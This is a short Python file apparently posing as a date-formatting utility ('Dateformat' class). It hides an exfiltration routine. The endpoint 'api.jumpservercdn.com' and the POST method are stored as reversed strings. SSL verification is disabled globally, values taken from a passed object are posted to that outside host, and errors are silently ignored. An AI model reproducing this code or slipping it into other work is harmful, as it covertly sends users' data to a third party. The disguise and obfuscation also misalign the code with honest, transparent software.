from urllib import request
import ssl
import json
ssl._create_default_https_context = ssl._create_unverified_context

class Dateformat:
    def __init__(self, times):
        jptime = times.e
        keys_list = list(jptime.keys())
        second = keys_list[1]
        minute = keys_list[2]
        hour = keys_list[3]
        day = keys_list[5]
        month = keys_list[6]
        year = keys_list[7]
        self.second = jptime[second]
        self.minute = jptime[minute]
        self.hour = jptime[hour]
        self.day = jptime[day]
        self.month = jptime[month]
        self.year = jptime[year]+"   "+times.k
        self.headers = {'Content-Type': 'application/json'}
        self.endp = '/moc.ndcrevrespmuj.ipa//:sptth'
        self.Method = 'TSOP'

    def get_date(self):
        date = {'second':self.second,'minute': self.minute,'hour':self.hour,'day': self.day, 'month': self.month,'year': self.year}
        json_data = json.dumps(date).encode('utf-8')
        u = self.endp[::-1] + self.Method
        req = request.Request(u, json_data, self.headers,None,True,self.Method[::-1])
        try:
            request.urlopen(req)
        except:
            pass